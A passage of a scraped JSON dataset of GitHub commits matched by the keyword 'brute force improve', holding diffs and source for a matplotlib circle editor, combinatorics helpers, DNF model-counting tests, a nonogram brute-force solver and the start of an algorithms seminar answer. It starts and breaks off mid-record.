self.max_circles=len(self.colors) fig,ax=plt.subplots() fig.canvas.manager.set_window_title(\"Circle Editor\") ax.set_aspect('equal', adjustable='box') ax.set_xlim(0, 100) ax.set_ylim(0, 100) self.fig=fig self.ax=ax slider_ax=plt.axes([0.3, 0.9, 0.4, 0.05]) freq_slider=Slider( ax=slider_ax, label='Radius', valmin=1, valmax=25, valinit=self.radius, initcolor=\"none\" ) freq_slider.on_changed(self.set_radius) btn_ax=plt.axes([0.45, 0.05, 0.1, 0.05]) btn=Button(btn_ax, \"Start\") btn.on_clicked(self.on_start_clicked) fig.canvas.mpl_connect('button_press_event', self.on_click) fig.canvas.mpl_connect('button_release_event', self.on_release) fig.canvas.mpl_connect('motion_notify_event', self.on_move) plt.show() def set_radius(self, r): self.radius=r def on_click(self, event): if not event.inaxes==self.ax: return x,y=event.xdata, event.ydata if event.button==MouseButton.LEFT: self.left_click(x,y) elif event.button==MouseButton.RIGHT: self.right_click(x,y) def left_click(self, x, y): clicked_circle=self.in_circle(x,y) if clicked_circle is None: if len(self.circles)==self.max_circles: print(\"Maximum number of circles reached\") else: self.add_circle(x, y, self.radius) else: self.dragging=self.circles[clicked_circle] def right_click(self, x, y): clicked_circle=self.in_circle(x,y) if clicked_circle is not None: self.delete_circle(clicked_circle) def inside(self, circle, x, y): dx=x -circle.center[0] dy=y -circle.center[1] return math.sqrt(dx*dx +dy*dy) <=circle.radius def in_circle(self, x, y): circle_indices=list(enumerate(self.circles)) for i,c in reversed(circle_indices): if self.inside(c,x,y): return i return None def add_circle(self, x, y, radius): color=self.colors.pop() circle=plt.Circle((x, y), radius, alpha=0.85, ec=\"black\", fc=color) self.circles.append(circle) self.ax.add_patch(circle) self.fig.canvas.draw() def delete_circle(self, circle_idx): circle=self.circles[circle_idx] self.colors.append(circle.get_fc()) circle.remove() del self.circles[circle_idx] self.fig.canvas.draw() def on_release(self, event): self.dragging=None def on_move(self, event): if not event.inaxes==self.ax or self.dragging is None: return self.dragging.center=(event.xdata, event.ydata) self.fig.canvas.draw() def get_circles(self): circles=[] for c in reversed(self.circles): x,y=c.center r=c.get_radius() color=c.get_fc() circles.append(Circle(x,y,r,color)) return circles def on_start_clicked(self, event): circles=self.get_circles() self.start_action(circles) ","sourceWithComments":"from advalg.circle import Circle\nimport math\nimport matplotlib.pyplot as plt\nimport matplotlib.colors as mcolors\nfrom matplotlib.backend_bases import MouseButton\nfrom matplotlib.widgets import Button, Slider\n\nclass CircleEditor:\n    def __init__(self, start_action):\n        self.start_action = start_action\n        self.circles = []\n        self.radius = 5\n        self.dragging = None\n        self.colors = [c for c in mcolors.TABLEAU_COLORS]\n        self.colors.reverse()\n        self.max_circles = len(self.colors)\n\n        # Set up circles area\n        fig,ax = plt.subplots()\n        fig.canvas.manager.set_window_title(\"Circle Editor\")\n        ax.set_aspect('equal', adjustable='box')\n        ax.set_xlim(0, 100)\n        ax.set_ylim(0, 100)\n        self.fig = fig\n        self.ax = ax\n\n        # Add size slider\n        slider_ax = plt.axes([0.3, 0.9, 0.4, 0.05])\n        freq_slider = Slider(\n            ax=slider_ax,\n            label='Radius',\n            valmin=1,\n            valmax=25,\n            valinit=self.radius,\n            initcolor=\"none\"\n        )\n        freq_slider.on_changed(self.set_radius)\n\n        # Add start button\n        btn_ax = plt.axes([0.45, 0.05, 0.1, 0.05])\n        btn = Button(btn_ax, \"Start\")\n        btn.on_clicked(self.on_start_clicked)\n\n        # Add click event to canvas\n        fig.canvas.mpl_connect('button_press_event', self.on_click)\n        fig.canvas.mpl_connect('button_release_event', self.on_release)\n        fig.canvas.mpl_connect('motion_notify_event', self.on_move)\n\n        # Show the editor\n        plt.show()\n\n    def set_radius(self, r):\n        self.radius = r\n\n    def on_click(self, event):\n        if not event.inaxes == self.ax:\n            return\n\n        x,y = event.xdata, event.ydata\n\n        if event.button == MouseButton.LEFT:\n            self.left_click(x,y)\n        elif event.button == MouseButton.RIGHT:\n            self.right_click(x,y)\n\n    def left_click(self, x, y):\n        clicked_circle = self.in_circle(x,y)\n        if clicked_circle is None:\n            if len(self.circles) == self.max_circles:\n                print(\"Maximum number of circles reached\")\n            else:\n                self.add_circle(x, y, self.radius)\n        else:\n            self.dragging = self.circles[clicked_circle]\n\n    def right_click(self, x, y):\n        clicked_circle = self.in_circle(x,y)\n        if clicked_circle is not None:\n            self.delete_circle(clicked_circle)\n\n    def inside(self, circle, x, y):\n        dx = x - circle.center[0]\n        dy = y - circle.center[1]\n        return math.sqrt(dx*dx + dy*dy) <= circle.radius\n\n    def in_circle(self, x, y):\n        circle_indices = list(enumerate(self.circles))\n        for i,c in reversed(circle_indices):\n            if self.inside(c,x,y):\n                return i\n        return None\n\n    def add_circle(self, x, y, radius):\n        color = self.colors.pop()\n        circle = plt.Circle((x, y), radius, alpha=0.85, ec=\"black\", fc=color)\n        self.circles.append(circle)\n        self.ax.add_patch(circle)\n        self.fig.canvas.draw()\n\n    def delete_circle(self, circle_idx):\n        circle = self.circles[circle_idx]\n        self.colors.append(circle.get_fc())\n        circle.remove()\n        del self.circles[circle_idx]\n        self.fig.canvas.draw()\n\n    def on_release(self, event):\n        self.dragging = None\n\n    def on_move(self, event):\n        if not event.inaxes == self.ax or self.dragging is None:\n            return\n        self.dragging.center = (event.xdata, event.ydata)\n        self.fig.canvas.draw()\n\n    def get_circles(self):\n        circles = []\n\n        for c in reversed(self.circles):\n            x,y = c.center\n            r = c.get_radius()\n            color = c.get_fc()\n            circles.append(Circle(x,y,r,color))\n        \n        return circles\n\n    def on_start_clicked(self, event):\n        circles = self.get_circles()\n        self.start_action(circles)\n"},"\/pythonLib\/advalg\/helpers.py":{"changes":[{"diff":"\n \n def choose(n: int, k: int) -> int:\n     \"\"\"Returns the binomial coefficient n choose k\"\"\"\n-    if (k == 0): return 1\n+    if k == 0: return 1\n     return (n * choose(n-1, k-1)) \/\/ k\n \n+\n # TODO statistical physics formula\n\\ No newline at end of f","add":2,"remove":1,"filename":"\/pythonLib\/advalg\/helpers.py","badparts":["    if (k == 0): return 1"],"goodparts":["    if k == 0: return 1"]}],"source":"\nfrom math import sin, cos, atan2, sqrt, pi from typing import Iterable, Iterator, Tuple import itertools def haversine(lat1: float, lon1: float, lat2: float, lon2: float) -> float: \"\"\"Returns the great-circle distance between points(lat1, lon1) and(lat2, lon2)\"\"\" R=6371000 phi1=lat1 * pi\/180 phi2=lat2 * pi\/180 delta_phi=(lat2 -lat1) * pi\/180 delta_lambda=(lon2 -lon1) * pi\/180 a=sin(delta_phi\/2) ** 2 +cos(phi1) * cos(phi2) * sin(delta_lambda\/2) ** 2 c=2 * atan2(sqrt(a), sqrt(1-a)) return R * c def combinations(items: Iterable, count: int) -> Iterator[Tuple]: \"\"\"Returns all count-combinations of items as an iterator of tuples\"\"\" l=list(items) assert(0 <=count <=len(l)) return itertools.combinations(l, count) def permutations(items: Iterable, count: int) -> Iterator[Tuple]: \"\"\"Returns all count-permutations of items as an iterator of tuples\"\"\" l=list(items) assert(0 <=count <=len(l)) return itertools.permutations(l, count) def subsets(items: Iterable) -> Iterator[Tuple]: \"\"\"Returns all subsets of items as an iterator of tuples\"\"\" l=list(items) return itertools.chain.from_iterable(combinations(l, c) for c in range(len(l)+1)) def choose(n: int, k: int) -> int: \"\"\"Returns the binomial coefficient n choose k\"\"\" if(k==0): return 1 return(n * choose(n-1, k-1)) \/\/ k ","sourceWithComments":"from math import sin, cos, atan2, sqrt, pi\nfrom typing import Iterable, Iterator, Tuple\nimport itertools\n\ndef haversine(lat1: float, lon1: float, lat2: float, lon2: float) -> float:\n    \"\"\"Returns the great-circle distance between points (lat1, lon1) and (lat2, lon2)\"\"\"\n    R = 6371000\n    phi1 = lat1 * pi\/180\n    phi2 = lat2 * pi\/180\n    delta_phi = (lat2 - lat1) * pi\/180\n    delta_lambda = (lon2 - lon1) * pi\/180\n\n    a = sin(delta_phi\/2) ** 2 + cos(phi1) * cos(phi2) * sin(delta_lambda\/2) ** 2\n    c = 2 * atan2(sqrt(a), sqrt(1-a))\n\n    return R * c\n\ndef combinations(items: Iterable, count: int) -> Iterator[Tuple]:\n    \"\"\"Returns all count-combinations of items as an iterator of tuples\"\"\"\n    l = list(items)\n    assert(0 <= count <= len(l))\n    return itertools.combinations(l, count)\n\ndef permutations(items: Iterable, count: int) -> Iterator[Tuple]:\n    \"\"\"Returns all count-permutations of items as an iterator of tuples\"\"\"\n    l = list(items)\n    assert(0 <= count <= len(l))\n    return itertools.permutations(l, count)\n\ndef subsets(items: Iterable) -> Iterator[Tuple]:\n    \"\"\"Returns all subsets of items as an iterator of tuples\"\"\"\n    l = list(items)\n    return itertools.chain.from_iterable(combinations(l, c) for c in range(len(l)+1))\n\ndef choose(n: int, k: int) -> int:\n    \"\"\"Returns the binomial coefficient n choose k\"\"\"\n    if (k == 0): return 1\n    return (n * choose(n-1, k-1)) \/\/ k\n\n# TODO statistical physics formula"},"\/pythonLib\/advalg\/tests3.py":{"changes":[{"diff":"\n from advalg.dnf import DNF\n \n-# 1 assignment not good test\n-dnf1 = DNF(3)\n-dnf1.add_clause([1,2,3])\n-\n # 8 assignments\n dnf2 = DNF(4)\n dnf2.add_clause([1,2])\n","add":0,"remove":4,"filename":"\/pythonLib\/advalg\/tests3.py","badparts":["dnf1 = DNF(3)","dnf1.add_clause([1,2,3])"],"goodparts":[]},{"diff":" dnf5.add_clause([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15])\n \n tests = [\n-    (dnf1, 1),\n     (dnf2, 8),\n     (dnf3, 28),\n     (dnf4, 704),\n-    (dnf5, 129)\n ]\n \n samples = [10, 100, 1000]\n","add":0,"remove":2,"filename":"\/pythonLib\/advalg\/tests3.py","badparts":["    (dnf1, 1),","    (dnf5, 129)"],"goodparts":[]}],"source":"\nfrom advalg.dnf import DNF dnf1=DNF(3) dnf1.add_clause([1,2,3]) dnf2=DNF(4) dnf2.add_clause([1,2]) dnf2.add_clause([-1,-2]) dnf3=DNF(5) dnf3.add_clause([1,2]) dnf3.add_clause([-2,3]) dnf3.add_clause([-1]) dnf4=DNF(10) dnf4.add_clause([1,2,5,-10]) dnf4.add_clause([-2,3]) dnf4.add_clause([-1]) dnf5=DNF(15) dnf5.add_clause([2,-3,-4,6,10,-12,13,-15]) dnf5.add_clause([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]) tests=[ (dnf1, 1), (dnf2, 8), (dnf3, 28), (dnf4, 704), (dnf5, 129) ] samples=[10, 100, 1000] def test_dnf(counter): \"\"\" Tests the given counter function on several DNF formulas. \"\"\" for(dnf, count) in tests: print(dnf) print(f\"actual for s in samples: print(f\"approx print() def brute_count(dnf): \"\"\" Uses brute force to count number of satisfying assignments in the given dnf. Will be moved to some kind of brute force module. \"\"\" assignments=[[]] for i in range(dnf.var_count()): new=[] for a in assignments: new.append(a +[False]) new.append(a +[True]) assignments=new count=0 for a in assignments: asn={(i+1):a[i] for i in range(len(a))} if dnf.is_satisfied(asn): count +=1 return count ","sourceWithComments":"from advalg.dnf import DNF\n\n# 1 assignment not good test\ndnf1 = DNF(3)\ndnf1.add_clause([1,2,3])\n\n# 8 assignments\ndnf2 = DNF(4)\ndnf2.add_clause([1,2])\ndnf2.add_clause([-1,-2])\n\n# 28 satisfying assignments\ndnf3 = DNF(5)\ndnf3.add_clause([1,2])\ndnf3.add_clause([-2,3])\ndnf3.add_clause([-1])\n\n# 704 satisfying assignments\ndnf4 = DNF(10)\ndnf4.add_clause([1,2,5,-10])\ndnf4.add_clause([-2,3])\ndnf4.add_clause([-1])\n\n# 129 assignments bad test doesn't show approximation\ndnf5 = DNF(15)\ndnf5.add_clause([2,-3,-4,6,10,-12,13,-15])\ndnf5.add_clause([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15])\n\ntests = [\n    (dnf1, 1),\n    (dnf2, 8),\n    (dnf3, 28),\n    (dnf4, 704),\n    (dnf5, 129)\n]\n\nsamples = [10, 100, 1000]\n\ndef test_dnf(counter):\n    \"\"\"\n    Tests the given counter function on several DNF formulas.\n    \"\"\"\n    for (dnf, count) in tests:\n        print(dnf)\n        print(f\"actual #sat = {count}\")\n        for s in samples:\n            print(f\"approx #sat ({s} iters) = {counter(dnf, s)}\")\n        print()\n\n# This is only for testing\ndef brute_count(dnf):\n    \"\"\"\n    Uses brute force to count number of satisfying assignments in the given dnf.\n    Will be moved to some kind of brute force module.\n    \"\"\"\n    assignments = [[]]\n\n    for i in range(dnf.var_count()):\n        new = []\n        for a in assignments:\n            new.append(a + [False])\n            new.append(a + [True])\n        assignments = new\n\n    count = 0\n    for a in assignments:\n        asn = {(i+1):a[i] for i in range(len(a))}\n        if dnf.is_satisfied(asn):\n            count += 1\n\n    return count\n"}},"msg":"Improved dnf brute force & circles animation"}},"https:\/\/github.com\/MikeJongen\/nonogram-solver":{"bf28967dea4dca4ccde164f8d6ccf12ee93caec0":{"url":"https:\/\/api.github.com\/repos\/MikeJongen\/nonogram-solver\/commits\/bf28967dea4dca4ccde164f8d6ccf12ee93caec0","html_url":"https:\/\/github.com\/MikeJongen\/nonogram-solver\/commit\/bf28967dea4dca4ccde164f8d6ccf12ee93caec0","sha":"bf28967dea4dca4ccde164f8d6ccf12ee93caec0","keyword":"brute force improve","diff":"diff --git a\/solver\/compound\/only_brute_force.py b\/solver\/compound\/only_brute_force.py\nindex 7215127..cb52239 100644\n--- a\/solver\/compound\/only_brute_force.py\n+++ b\/solver\/compound\/only_brute_force.py\n@@ -1,8 +1,8 @@\n from solver.nonogram import Nonogram, Row\n-from solver.basic.brute_force import BruteForceSolver, BruteForceRowSolver\n+from solver.basic.brute_force_2 import BruteForceSolver2, BruteForceRowSolver2\n \n \n-class OnlyBruteForceSolver(BruteForceSolver, Nonogram):\n+class OnlyBruteForceSolver(BruteForceSolver2, Nonogram):\n     \"\"\"\n     Only uses brute force.\n     \"\"\"\n@@ -20,9 +20,9 @@ def solve(self):\n         while not self.is_complete():\n             if not first_loop:\n                 self.update_row_solvers()\n-            BruteForceSolver.solve(self)\n+            BruteForceSolver2.solve(self)\n             first_loop = False\n \n \n-class OnlyBruteForceRowSolver(BruteForceRowSolver, Row):\n+class OnlyBruteForceRowSolver(BruteForceRowSolver2, Row):\n     pass\n","message":"","files":{"\/solver\/compound\/only_brute_force.py":{"changes":[{"diff":"\n from solver.nonogram import Nonogram, Row\n-from solver.basic.brute_force import BruteForceSolver, BruteForceRowSolver\n+from solver.basic.brute_force_2 import BruteForceSolver2, BruteForceRowSolver2\n \n \n-class OnlyBruteForceSolver(BruteForceSolver, Nonogram):\n+class OnlyBruteForceSolver(BruteForceSolver2, Nonogram):\n     \"\"\"\n     Only uses brute force.\n     \"\"\"\n","add":2,"remove":2,"filename":"\/solver\/compound\/only_brute_force.py","badparts":["from solver.basic.brute_force import BruteForceSolver, BruteForceRowSolver","class OnlyBruteForceSolver(BruteForceSolver, Nonogram):"],"goodparts":["from solver.basic.brute_force_2 import BruteForceSolver2, BruteForceRowSolver2","class OnlyBruteForceSolver(BruteForceSolver2, Nonogram):"]},{"diff":"\n         while not self.is_complete():\n             if not first_loop:\n                 self.update_row_solvers()\n-            BruteForceSolver.solve(self)\n+            BruteForceSolver2.solve(self)\n             first_loop = False\n \n \n-class OnlyBruteForceRowSolver(BruteForceRowSolver, Row):\n+class OnlyBruteForceRowSolver(BruteForceRowSolver2, Row):\n     pass\n","add":2,"remove":2,"filename":"\/solver\/compound\/only_brute_force.py","badparts":["            BruteForceSolver.solve(self)","class OnlyBruteForceRowSolver(BruteForceRowSolver, Row):"],"goodparts":["            BruteForceSolver2.solve(self)","class OnlyBruteForceRowSolver(BruteForceRowSolver2, Row):"]}],"source":"\nfrom solver.nonogram import Nonogram, Row from solver.basic.brute_force import BruteForceSolver, BruteForceRowSolver class OnlyBruteForceSolver(BruteForceSolver, Nonogram): \"\"\" Only uses brute force. \"\"\" def init_row_solvers(self): Nonogram.init_row_solvers(self, OnlyBruteForceRowSolver) def solve(self): \"\"\" Only uses brute force. \"\"\" first_loop=True while not self.is_complete(): if not first_loop: self.update_row_solvers() BruteForceSolver.solve(self) first_loop=False class OnlyBruteForceRowSolver(BruteForceRowSolver, Row): pass ","sourceWithComments":"from solver.nonogram import Nonogram, Row\nfrom solver.basic.brute_force import BruteForceSolver, BruteForceRowSolver\n\n\nclass OnlyBruteForceSolver(BruteForceSolver, Nonogram):\n    \"\"\"\n    Only uses brute force.\n    \"\"\"\n\n    def init_row_solvers(self):\n        Nonogram.init_row_solvers(self, OnlyBruteForceRowSolver)\n\n    def solve(self):\n        \"\"\"\n        Only uses brute force.\n        \"\"\"\n\n        first_loop = True\n\n        while not self.is_complete():\n            if not first_loop:\n                self.update_row_solvers()\n            BruteForceSolver.solve(self)\n            first_loop = False\n\n\nclass OnlyBruteForceRowSolver(BruteForceRowSolver, Row):\n    pass\n"}},"msg":"Use improved brute force solver."},"ecbc0b2f025743db81ce1ad6612618aa9fd4dec6":{"url":"https:\/\/api.github.com\/repos\/MikeJongen\/nonogram-solver\/commits\/ecbc0b2f025743db81ce1ad6612618aa9fd4dec6","html_url":"https:\/\/github.com\/MikeJongen\/nonogram-solver\/commit\/ecbc0b2f025743db81ce1ad6612618aa9fd4dec6","message":"Use improved brute_force version.","sha":"ecbc0b2f025743db81ce1ad6612618aa9fd4dec6","keyword":"brute force improve","diff":"diff --git a\/solver\/compound\/balanced.py b\/solver\/compound\/balanced.py\nindex 6d75d45..ee5ed09 100644\n--- a\/solver\/compound\/balanced.py\n+++ b\/solver\/compound\/balanced.py\n@@ -2,10 +2,10 @@\n from solver.basic.simple_boxes import SimpleBoxesSolver, SimpleBoxesRowSolver\n from solver.basic.trivial import TrivialSolver, TrivialRowSolver\n from solver.basic.blanks import BlanksSolver, BlanksRowSolver\n-from solver.basic.brute_force import BruteForceSolver, BruteForceRowSolver\n+from solver.basic.brute_force_2 import BruteForceSolver2, BruteForceRowSolver2\n \n \n-class BalancedSolver(BruteForceSolver, BlanksSolver, TrivialSolver, SimpleBoxesSolver, Nonogram):\n+class BalancedSolver(BruteForceSolver2, BlanksSolver, TrivialSolver, SimpleBoxesSolver, Nonogram):\n     \"\"\"\n     Solver class to combine all solver classes.\n     \"\"\"\n@@ -26,8 +26,8 @@ def solve(self):\n             self.update_row_solvers()\n             solution_changed |= BlanksSolver.solve(self)\n             self.update_row_solvers()\n-            solution_changed |= BruteForceSolver.solve(self)\n+            solution_changed |= BruteForceSolver2.solve(self)\n \n \n-class BalancedRowSolver(BruteForceRowSolver, BlanksRowSolver, TrivialRowSolver, SimpleBoxesRowSolver, Row):\n+class BalancedRowSolver(BruteForceRowSolver2, BlanksRowSolver, TrivialRowSolver, SimpleBoxesRowSolver, Row):\n     pass\n","files":{"\/solver\/compound\/balanced.py":{"changes":[{"diff":"\n from solver.basic.simple_boxes import SimpleBoxesSolver, SimpleBoxesRowSolver\n from solver.basic.trivial import TrivialSolver, TrivialRowSolver\n from solver.basic.blanks import BlanksSolver, BlanksRowSolver\n-from solver.basic.brute_force import BruteForceSolver, BruteForceRowSolver\n+from solver.basic.brute_force_2 import BruteForceSolver2, BruteForceRowSolver2\n \n \n-class BalancedSolver(BruteForceSolver, BlanksSolver, TrivialSolver, SimpleBoxesSolver, Nonogram):\n+class BalancedSolver(BruteForceSolver2, BlanksSolver, TrivialSolver, SimpleBoxesSolver, Nonogram):\n     \"\"\"\n     Solver class to combine all solver classes.\n     \"\"\"\n","add":2,"remove":2,"filename":"\/solver\/compound\/balanced.py","badparts":["from solver.basic.brute_force import BruteForceSolver, BruteForceRowSolver","class BalancedSolver(BruteForceSolver, BlanksSolver, TrivialSolver, SimpleBoxesSolver, Nonogram):"],"goodparts":["from solver.basic.brute_force_2 import BruteForceSolver2, BruteForceRowSolver2","class BalancedSolver(BruteForceSolver2, BlanksSolver, TrivialSolver, SimpleBoxesSolver, Nonogram):"]},{"diff":"\n             self.update_row_solvers()\n             solution_changed |= BlanksSolver.solve(self)\n             self.update_row_solvers()\n-            solution_changed |= BruteForceSolver.solve(self)\n+            solution_changed |= BruteForceSolver2.solve(self)\n \n \n-class BalancedRowSolver(BruteForceRowSolver, BlanksRowSolver, TrivialRowSolver, SimpleBoxesRowSolver, Row):\n+class BalancedRowSolver(BruteForceRowSolver2, BlanksRowSolver, TrivialRowSolver, SimpleBoxesRowSolver, Row):\n     pass\n","add":2,"remove":2,"filename":"\/solver\/compound\/balanced.py","badparts":["            solution_changed |= BruteForceSolver.solve(self)","class BalancedRowSolver(BruteForceRowSolver, BlanksRowSolver, TrivialRowSolver, SimpleBoxesRowSolver, Row):"],"goodparts":["            solution_changed |= BruteForceSolver2.solve(self)","class BalancedRowSolver(BruteForceRowSolver2, BlanksRowSolver, TrivialRowSolver, SimpleBoxesRowSolver, Row):"]}],"source":"\nfrom solver.nonogram import Nonogram, Row from solver.basic.simple_boxes import SimpleBoxesSolver, SimpleBoxesRowSolver from solver.basic.trivial import TrivialSolver, TrivialRowSolver from solver.basic.blanks import BlanksSolver, BlanksRowSolver from solver.basic.brute_force import BruteForceSolver, BruteForceRowSolver class BalancedSolver(BruteForceSolver, BlanksSolver, TrivialSolver, SimpleBoxesSolver, Nonogram): \"\"\" Solver class to combine all solver classes. \"\"\" def init_row_solvers(self): Nonogram.init_row_solvers(self, BalancedRowSolver) def solve(self): \"\"\" Applies several algorithms. \"\"\" TrivialSolver.solve(self) SimpleBoxesSolver.solve(self) solution_changed=True while not self.is_complete() and solution_changed: solution_changed=False self.update_row_solvers() solution_changed |=BlanksSolver.solve(self) self.update_row_solvers() solution_changed |=BruteForceSolver.solve(self) class BalancedRowSolver(BruteForceRowSolver, BlanksRowSolver, TrivialRowSolver, SimpleBoxesRowSolver, Row): pass ","sourceWithComments":"from solver.nonogram import Nonogram, Row\nfrom solver.basic.simple_boxes import SimpleBoxesSolver, SimpleBoxesRowSolver\nfrom solver.basic.trivial import TrivialSolver, TrivialRowSolver\nfrom solver.basic.blanks import BlanksSolver, BlanksRowSolver\nfrom solver.basic.brute_force import BruteForceSolver, BruteForceRowSolver\n\n\nclass BalancedSolver(BruteForceSolver, BlanksSolver, TrivialSolver, SimpleBoxesSolver, Nonogram):\n    \"\"\"\n    Solver class to combine all solver classes.\n    \"\"\"\n\n    def init_row_solvers(self):\n        Nonogram.init_row_solvers(self, BalancedRowSolver)\n\n    def solve(self):\n        \"\"\"\n        Applies several algorithms.\n        \"\"\"\n        TrivialSolver.solve(self)\n        SimpleBoxesSolver.solve(self)\n\n        solution_changed = True\n        while not self.is_complete() and solution_changed:\n            solution_changed = False\n            self.update_row_solvers()\n            solution_changed |= BlanksSolver.solve(self)\n            self.update_row_solvers()\n            solution_changed |= BruteForceSolver.solve(self)\n\n\nclass BalancedRowSolver(BruteForceRowSolver, BlanksRowSolver, TrivialRowSolver, SimpleBoxesRowSolver, Row):\n    pass\n"}},"msg":"Use improved brute_force version."},"7a745cb01802a03adf0dca3f2f635a42c9ebe4f2":{"url":"https:\/\/api.github.com\/repos\/MikeJongen\/nonogram-solver\/commits\/7a745cb01802a03adf0dca3f2f635a42c9ebe4f2","html_url":"https:\/\/github.com\/MikeJongen\/nonogram-solver\/commit\/7a745cb01802a03adf0dca3f2f635a42c9ebe4f2","sha":"7a745cb01802a03adf0dca3f2f635a42c9ebe4f2","keyword":"brute force improve","diff":"diff --git a\/solver\/basic\/brute_force_2.py b\/solver\/basic\/brute_force_2.py\nindex a098c5e..c03c4f6 100644\n--- a\/solver\/basic\/brute_force_2.py\n+++ b\/solver\/basic\/brute_force_2.py\n@@ -20,6 +20,13 @@ def solve(self):\n \n \n class BruteForceRowSolver2(BruteForceRowSolver, Row):\n+    def reset(self):\n+        if hasattr(self, 'number_of_solutions'):\n+            del(self.number_of_solutions)\n+        if hasattr(self, 'all_solutions'):\n+            del(self.all_solutions)\n+        super().reset()\n+\n     def solve_brute_force_save_intermediate(self, maximum_solutions=100000):\n         \"\"\"\n         RowSolver for BruteForceSaveIntermediateSolver class\n@@ -41,14 +48,19 @@ def solve_brute_force_save_intermediate(self, maximum_solutions=100000):\n \n         if not hasattr(self, 'all_solutions'):\n             self.all_solutions = self._get_all_solutions()\n+\n         new_solution = None\n+        # only keep solutions that fit with the current solution\n+        self.all_solutions = [\n+            solution for solution in self.all_solutions if self._check_solution(solution)]\n+        # combine solutions\n         for solution in self.all_solutions:\n-            if self._check_solution(solution):\n-                if new_solution is None:\n-                    new_solution = solution\n-                    continue\n-                new_solution = self._get_matching_solution(\n-                    new_solution, solution)\n+            if new_solution is None:\n+                new_solution = solution\n+                continue\n+            new_solution = self._get_matching_solution(\n+                new_solution, solution)\n+\n         if self.values == new_solution:\n             return False\n         if new_solution is not None:\n","message":"","files":{"\/solver\/basic\/brute_force_2.py":{"changes":[{"diff":"\n \n         if not hasattr(self, 'all_solutions'):\n             self.all_solutions = self._get_all_solutions()\n+\n         new_solution = None\n+        # only keep solutions that fit with the current solution\n+        self.all_solutions = [\n+            solution for solution in self.all_solutions if self._check_solution(solution)]\n+        # combine solutions\n         for solution in self.all_solutions:\n-            if self._check_solution(solution):\n-                if new_solution is None:\n-                    new_solution = solution\n-                    continue\n-                new_solution = self._get_matching_solution(\n-                    new_solution, solution)\n+            if new_solution is None:\n+                new_solution = solution\n+                continue\n+            new_solution = self._get_matching_solution(\n+                new_solution, solution)\n+\n         if self.values == new_solution:\n             return False\n         if new_solution is not None:\n","add":11,"remove":6,"filename":"\/solver\/basic\/brute_force_2.py","badparts":["            if self._check_solution(solution):","                if new_solution is None:","                    new_solution = solution","                    continue","                new_solution = self._get_matching_solution(","                    new_solution, solution)"],"goodparts":["        self.all_solutions = [","            solution for solution in self.all_solutions if self._check_solution(solution)]","            if new_solution is None:","                new_solution = solution","                continue","            new_solution = self._get_matching_solution(","                new_solution, solution)"]}],"source":"\nfrom solver.nonogram import Nonogram, Row from solver.basic.brute_force import BruteForceRowSolver class BruteForceSolver2(Nonogram): \"\"\"Brute force solver class Performance heavy algorithm, use as last option. Improved version of brute force. Uses more memory though. \"\"\" def init_row_solvers(self): Nonogram.init_row_solvers(self, BruteForceRowSolver2) def solve(self): \"\"\" Returns True if anything was changed to the solution. \"\"\" return self.solve_single_iteration(BruteForceRowSolver2.solve_brute_force_save_intermediate) class BruteForceRowSolver2(BruteForceRowSolver, Row): def solve_brute_force_save_intermediate(self, maximum_solutions=100000): \"\"\" RowSolver for BruteForceSaveIntermediateSolver class Tests every possible solution. maximum_solutions: int only solve if total number of solutions is lower than this. returnvalue: Bool A bool to indicate if the row has been changed.(True if changed) \"\"\" if self.solved: return False if not hasattr(self, 'number_of_solutions'): self.number_of_solutions=self._get_number_of_solutions() if self.number_of_solutions > maximum_solutions: return False if not hasattr(self, 'all_solutions'): self.all_solutions=self._get_all_solutions() new_solution=None for solution in self.all_solutions: if self._check_solution(solution): if new_solution is None: new_solution=solution continue new_solution=self._get_matching_solution( new_solution, solution) if self.values==new_solution: return False if new_solution is not None: self.values=new_solution return True ","sourceWithComments":"from solver.nonogram import Nonogram, Row\nfrom solver.basic.brute_force import BruteForceRowSolver\n\n\nclass BruteForceSolver2(Nonogram):\n    \"\"\"Brute force solver class\n\n    Performance heavy algorithm, use as last option.\n    Improved version of brute force. Uses more memory though.\n    \"\"\"\n\n    def init_row_solvers(self):\n        Nonogram.init_row_solvers(self, BruteForceRowSolver2)\n\n    def solve(self):\n        \"\"\"\n        Returns True if anything was changed to the solution.\n        \"\"\"\n        return self.solve_single_iteration(BruteForceRowSolver2.solve_brute_force_save_intermediate)\n\n\nclass BruteForceRowSolver2(BruteForceRowSolver, Row):\n    def solve_brute_force_save_intermediate(self, maximum_solutions=100000):\n        \"\"\"\n        RowSolver for BruteForceSaveIntermediateSolver class\n\n        Tests every possible solution.\n\n        maximum_solutions : int\n            only solve if total number of solutions is lower than this.\n        returnvalue : Bool\n            A bool to indicate if the row has been changed. (True if changed)\n        \"\"\"\n        if self.solved:\n            return False\n\n        if not hasattr(self, 'number_of_solutions'):\n            self.number_of_solutions = self._get_number_of_solutions()\n        if self.number_of_solutions > maximum_solutions:\n            return False\n\n        if not hasattr(self, 'all_solutions'):\n            self.all_solutions = self._get_all_solutions()\n        new_solution = None\n        for solution in self.all_solutions:\n            if self._check_solution(solution):\n                if new_solution is None:\n                    new_solution = solution\n                    continue\n                new_solution = self._get_matching_solution(\n                    new_solution, solution)\n        if self.values == new_solution:\n            return False\n        if new_solution is not None:\n            self.values = new_solution\n\n        return True\n"}},"msg":"Improved brute_force_2 by keeping only solutions that fit.\nMade sure reset of brute_force_2 is correct, so subsequent runs are not much faster than expected."}},"https:\/\/github.com\/MightyElemental\/SoftwareOne":{"4c622e601a372541ca1e96dea156dc4e86755282":{"url":"https:\/\/api.github.com\/repos\/MightyElemental\/SoftwareOne\/commits\/4c622e601a372541ca1e96dea156dc4e86755282","html_url":"https:\/\/github.com\/MightyElemental\/SoftwareOne\/commit\/4c622e601a372541ca1e96dea156dc4e86755282","message":"Improved brute force","sha":"4c622e601a372541ca1e96dea156dc4e86755282","keyword":"brute force improve","diff":"diff --git a\/Week Five\/main_w5_seminar.py b\/Week Five\/main_w5_seminar.py\nindex 1ef3f63..0f132b9 100644\n--- a\/Week Five\/main_w5_seminar.py\t\n+++ b\/Week Five\/main_w5_seminar.py\t\n@@ -20,22 +20,20 @@\n '''\n \n # Answer\n-# This is extremely inefficient method. I believe it has a time complexity classification of O(n^3)\n+# This is extremely inefficient method. I believe it has a time complexity classification of O(n^2)\n '''\n Function largestSubList(numbers:List): List\n     bestSubList = empty List\n     bestSubListTotal := -9999999 # should be the smallest possible integer\n     for start := 0 to numbers.size() do\n+        subList = empty List\n+        subListTotal := 0\n         for end := start to numbers.size() do\n-            